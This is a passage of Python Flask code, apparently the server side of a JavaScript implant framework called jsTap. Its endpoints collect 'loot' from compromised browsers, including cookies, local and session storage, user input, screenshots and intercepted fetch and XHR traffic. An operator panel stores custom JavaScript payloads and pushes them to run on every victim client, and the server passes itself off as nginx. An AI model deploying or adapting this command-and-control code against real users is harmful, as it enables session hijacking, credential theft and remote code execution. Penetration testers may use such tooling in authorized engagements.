    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record Fetch API Setup
@app.route('/loot/fetchSetup/<identifier>', methods=['POST'])
def recordFetchSetup(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    print("## Recording Fetch setup event")
    content = request.json 
    method  = content['method']
    url     = content['url']
    logEvent(identifier, "Fetch Setup: " + method + ", " + url)

    # Put it in the database
    newFetchSetup = FetchSetup(clientID=identifier, method=method, url=url)
    db.session.add(newFetchSetup)


    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newFetchSetup)
    newEvent  = Event(clientID=identifier, timeStamp=newFetchSetup.timeStamp, 
    eventType ='FETCHSETUP', eventID=newFetchSetup.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record Fetch API Header calls
@app.route('/loot/fetchHeader/<identifier>', methods=['POST'])
def recordFetchHeader(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    print("## Recording Fetch Header event")
    content = request.json 
    header  = content['header']
    value   = content['value']
    logEvent(identifier, "Fetch Header: " + header + ", " + value)

    # Put it in the database
    newFetchHeader = FetchHeader(clientID=identifier, header=header, value=value)
    db.session.add(newFetchHeader)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newFetchHeader)
    newEvent  = Event(clientID=identifier, timeStamp=newFetchHeader.timeStamp, 
    eventType ='FETCHHEADER', eventID=newFetchHeader.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200


# Record Fetch API calls
@app.route('/loot/fetchCall/<identifier>', methods=['POST'])
def recordFetchCall(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    print("## Recording Fetch api call")
    content      = request.json 
    requestBody  = content['requestBody']
    responseBody = content['responseBody']
    logEvent(identifier, "Fetch API Call: " + requestBody + ", " + responseBody)

    # Put it in the database
    newFetchCall = FetchCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
    db.session.add(newFetchCall)


    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newFetchCall)
    newEvent  = Event(clientID=identifier, timeStamp=newFetchCall.timeStamp, 
    eventType ='FETCHCALL', eventID=newFetchCall.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200


#***************************************************************************
# UI API Endpoints


# Get clients list
@app.route('/api/getClients', methods=['GET'])
@login_required
def getClients():
    clients = Client.query.all()

    allClients = [{'id':escape(client.id), 'nickname':escape(client.nickname), 'notes':escape(client.notes), 
        'firstSeen':client.firstSeen, 'lastSeen':client.lastSeen, 'ip':escape(client.ipAddress),
        'platform':escape(client.platform), 'browser':escape(client.browser), 'isStarred':client.isStarred} for client in clients]

    return jsonify(allClients)




@app.route('/api/clientEvents/<id>', methods=['GET'])
@login_required
def getClientEvents(id):
    print("Retrieving events table for client: " + id)
    client = Client.query.filter_by(id=id).first()
    clientUUID = client.uuid;

    events = Event.query.filter_by(clientID=clientUUID)

    eventData = [{'id':escape(event.id), 'timeStamp':event.timeStamp, 
        'eventType':escape(event.eventType), 'eventID':escape(event.eventID)} for event in events]

    return jsonify(eventData)

    

@app.route('/api/clientScreenshot/<key>', methods=['GET'])
@login_required
def getClientScreenshots(key):
    screenshot = Screenshot.query.filter_by(id=key).first()

    screenshotData = {'fileName':escape(screenshot.fileName)}
    

    return jsonify(screenshotData)



@app.route('/api/clientHtml/<key>', methods=['GET'])
@login_required
def getClientHtml(key):
    htmlCode = HtmlCode.query.filter_by(id=key).first()

    # htmlData = {'url':htmlCode.url, 'code':escape(htmlCode.code)}

    # This one shouldn't be escaped
    htmlData = {'url':htmlCode.url, 'code':htmlCode.code, 'fileName':htmlCode.fileName}
    

    return jsonify(htmlData)



@app.route('/api/clientUrl/<key>', methods=['GET'])
@login_required
def getClientUrls(key):
    urlsVisited = UrlVisited.query.filter_by(id=key).first()

    urlData = {'url':escape(urlsVisited.url)}
    

    return jsonify(urlData)



@app.route('/api/clientUserInput/<key>', methods=['GET'])
@login_required
def getClientUserInputs(key):
    userInput = UserInput.query.filter_by(id=key).first()

    userInputData = {'inputName':escape(userInput.inputName), 'inputValue':escape(userInput.inputValue)}
    

    return jsonify(userInputData)



@app.route('/api/clientCookie/<key>', methods=['GET'])
@login_required
def getClientCookies(key):
    print("*** In cookie lookup, key is: " + key)
    cookie = Cookie.query.filter_by(id=key).first()

    cookieData = {'cookieName':escape(cookie.cookieName), 'cookieValue':escape(cookie.cookieValue)}
    

    return jsonify(cookieData)





@app.route('/api/clientLocalStorage/<key>', methods=['GET'])
@login_required
def getClientLocalStorage(key):
    # print("**** Fetching client local storage...")
    localStorage = LocalStorage.query.filter_by(id=key).first()
    print("Sending back: " + localStorage.key + ":" + localStorage.value)
    
    localStorageData = {'localStorageKey':escape(localStorage.key), 'localStorageValue':escape(localStorage.value)}
    

    return jsonify(localStorageData)




@app.route('/api/clientSessionStorage/<key>', methods=['GET'])
@login_required
def getClientSesssionStorage(key):
    sessionStorage = SessionStorage.query.filter_by(id=key).first()
    
    sessionStorageData = {'sessionStorageKey':escape(sessionStorage.key), 'sessionStorageValue':escape(sessionStorage.value)}
    

    return jsonify(sessionStorageData)


@app.route('/api/clientXhrOpen/<key>', methods=['GET'])
@login_required
def getClientXhrOpen(key):
    # print("**** Fetching client xhr api open call...")
    xhrOpen = XhrOpen.query.filter_by(id=key).first()

    xhrOpenData = {'method':escape(xhrOpen.method), 'url':escape(xhrOpen.url)}

    return jsonify(xhrOpenData)
 
 
@app.route('/api/clientXhrSetHeader/<key>', methods=['GET'])
@login_required
def getClientXhrSetHeader(key):
    # print("**** Fetching client xhr api set header call...")
    xhrSetHeader = XhrSetHeader.query.filter_by(id=key).first()

    xhrHeaderData = {'header':escape(xhrSetHeader.header), 'value':escape(xhrSetHeader.value)}

    return jsonify(xhrHeaderData)



@app.route('/api/clientXhrCall/<key>', methods=['GET'])
@login_required
def getClientXhrCall(key):
    # print("**** Fetching client xhr api call...")
    xhrCall = XhrCall.query.filter_by(id=key).first()

    xhrCallData = {'requestBody':xhrCall.requestBody, 'responseBody':xhrCall.responseBody}

    return jsonify(xhrCallData)



@app.route('/api/clientFetchSetup/<key>', methods=['GET'])
@login_required
def getClientFetchSetup(key):
    # print("**** Fetching client fetch setup call...")
    fetchSetup = FetchSetup.query.filter_by(id=key).first()

    fetchSetupData = {'method':escape(fetchSetup.method), 'url':escape(fetchSetup.url)}

    return jsonify(fetchSetupData)



@app.route('/api/clientFetchHeader/<key>', methods=['GET'])
@login_required
def getClientFetchHeader(key):
    # print("**** Fetching client fetch api header call...")
    fetchHeader = FetchHeader.query.filter_by(id=key).first()

    fetchHeaderData = {'header':escape(fetchHeader.header), 'value':escape(fetchHeader.value)}

    return jsonify(fetchHeaderData)



@app.route('/api/clientFetchCall/<key>', methods=['GET'])
@login_required
def getClientFetchCall(key):
    # print("**** Fetching client xhr api call...")
    fetchCall = FetchCall.query.filter_by(id=key).first()

    fetchCallData = {'requestBody':fetchCall.requestBody, 'responseBody':fetchCall.responseBody}

    return jsonify(fetchCallData)



@app.route('/api/updateClientNotes/<key>', methods=['POST'])
@login_required
def setClientNotes(key):
    content = request.json 
    newNote = content['note']
    client  = Client.query.filter_by(id=key).first()
   
    client.notes = newNote
    dbCommit()

    return "ok", 200



@app.route('/api/allClientNotes', methods=['GET'])
@login_required
def getAllClientNotes():
    clients = Client.query.all()
    allNoteData = [{'client':str(escape(client.nickname)), 'note':client.notes} for client in clients]

    return jsonify(allNoteData)


@app.route('/api/updateClientStar/<key>', methods=['POST'])
@login_required
def setClientStar(key):
    content   = request.json
    isStarred = content['isStarred']
    client    = Client.query.filter_by(id=key).first()
  
    client.isStarred = isStarred 
    dbCommit()

    return "ok", 200



@app.route('/api/app/allowNewClientSessions', methods=['GET'])
@login_required
def getAllowNewClientSessions():
    appSettngs = AppSettings.query.filter_by(id=1).first()

    newSessionData = {'newSessionsAllowed':appSettngs.allowNewSesssions}

    return jsonify(newSessionData)



@app.route('/api/app/setAllowNewClientSessions/<setting>', methods=['GET'])
@login_required
def setAllowNewClientSessions(setting):
    appSettngs = AppSettings.query.filter_by(id=1).first()
   
    if (setting != '0' and setting != '1'):
        return "No.", 401
    elif setting == '1':
        appSettngs.allowNewSesssions = True
    else:
        appSettngs.allowNewSesssions = False

    dbCommit()

    return "ok", 200



@app.route('/api/blockClientSession/<key>', methods=['GET'])
@login_required
def blockClientSession(key):
    client = Client.query.filter_by(id=key).first()
    client.sessionValid = False;
    dbCommit()

    return "ok", 200



@app.route('/api/getSavedPayloads', methods=['GET'])
@login_required
def getSavedCustomPayloads():
    savedPayloads = CustomPayload.query.all()

    allSavedPayloads = [{'id':escape(payload.id), 'name':escape(payload.name), 'autorun':payload.autorun} for payload in savedPayloads]

    return jsonify(allSavedPayloads)




@app.route('/api/getSavedPayloadCode/<key>', methods=['GET'])
@login_required
def getSavedPayloadCode(key):
    payload = CustomPayload.query.filter_by(id=key).first()

    payloadData = {'name':escape(payload.name), 'description':escape(payload.description),'code':escape(payload.code)}

    return jsonify(payloadData)


@app.route('/api/setPayloadAutorun', methods=['POST'])
@login_required
def setPayloadAutorun():
    content = request.json
    name    = content['name']
    autorun = content['autorun']

    payload = CustomPayload.query.filter_by(name=name).first()
    
    payload.autorun = autorun

    dbCommit()

    return "ok", 200


@app.route('/api/runPayloadAllClients/<key>', methods=['GET'])
@login_required
def runPayloadAllClients(key):
    payload = CustomPayload.query.filter_by(id=key).first()

    clients = Client.query.all()

    for client in clients:
        newJob = ClientPayloadJob(clientKey=client.id, code=payload.code)
        db.session.add(newJob)

    dbCommit()

    return "ok", 200


@app.route('/api/savePayload', methods=['POST'])
@login_required
def saveCustomPayload():
    content        = request.json 
    name           = content['name']
    newDescription = content['description']
    newCode        = content['code']

    # Check if this is an existing payload we're just updating
    payload = CustomPayload.query.filter_by(name=name).first()

    if payload is not None:
        payload.description = newDescription
        payload.code        = newCode
    else:
        newPayload = CustomPayload(name=name, description=newDescription, code=newCode)
        db.session.add(newPayload)

    dbCommit()

    return "ok", 200



@app.route('/api/deletePayload/<key>', methods=['GET'])
@login_required
def deleteCustomPayload(key):
    payload = CustomPayload.query.filter_by(id=key).first()
    db.session.delete(payload)
    dbCommit()

    return "ok", 200

#**************************************************************************



if __name__ == '__main__':
    printHeader()

    # Initilize our locks
    threadLock   = threading.Lock()
    databaseLock = threading.Lock()


    # Check for existing database file
    if database_exists('sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')):
        with app.app_context():
            print("!! SQLite database already exists:")
            clients = Client.query.all()
            numClients = len(clients)

            users = User.query.all()
            numUsers = len(users)

            print("Existing database has " + str(numClients) + " clients and " 
                + str(numUsers) + " users.")

            if numUsers != 0:
                print("Make selection on how to handle existing users:")
                print("1 - Keep existing users")
                print("2 - Delete all users and generate new admin account")

                val = int(input("\nSelection: "))
                if val == 2:
                    print("Generating new admin account")
                    User.__table__.drop(db.engine)
                    dbCommit()

                    db.create_all()

                    addAdminUser()
                elif val == 1:
                    print("Keeping existing users.")
                else:
                    print("Invalid selection.")
                    exit()


            if numClients != 0:
                print("Make selection on how to handle existing clients:")
                print("1 - Keep existing client data")
                print("2 - Delete all client data and start fresh")


                val = int(input("\nSelection: "))
                if val == 2:
                    print("Clearing client data")
                    Client.__table__.drop(db.engine)
                    Screenshot.__table__.drop(db.engine)
                    HtmlCode.__table__.drop(db.engine)
                    UrlVisited.__table__.drop(db.engine)
                    UserInput.__table__.drop(db.engine)
                    Cookie.__table__.drop(db.engine)
                    LocalStorage.__table__.drop(db.engine)
                    SessionStorage.__table__.drop(db.engine)
                    XhrOpen.__table__.drop(db.engine)
                    XhrSetHeader.__table__.drop(db.engine)
                    XhrCall.__table__.drop(db.engine)
                    FetchSetup.__table__.drop(db.engine)
                    FetchHeader.__table__.drop(db.engine)
                    FetchCall.__table__.drop(db.engine)
                    Event.__table__.drop(db.engine)
                    dbCommit()

                    db.create_all()
                    if os.path.exists(dataDirectory + "lootFiles"):
                        shutil.rmtree(dataDirectory + "lootFiles")

                elif val == 1:
                    print("Keeping existing client data.")
                else:
                    print("Invalid selection.")
                    exit()


    else:
        print("No database found")
        print("... creating database...")
        with app.app_context():
            db.drop_all()
            db.create_all()
            if os.path.exists(dataDirectory + "lootFiles"):
                shutil.rmtree(dataDirectory + "lootFiles")
            addAdminUser()
            initApplicationDefaults()


    with app.app_context():
        db.session.configure(autoflush=False)


    # Check for loot directory
    if not os.path.exists(dataDirectory + "lootFiles"):
        os.mkdir(dataDirectory + "lootFiles")

    # Response configuration
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    WSGIRequestHandler.server_version   = "nginx"
    WSGIRequestHandler.sys_version      = ""


    # If proxy mode we run HTTP and accept the proxy headers from nginx
    # If not proxy mode we'll run self-signed cert for testing
    if (proxyMode):
        app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
        app.run(debug=False, host='0.0.0.0', port=8444)
    else:
        app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
       


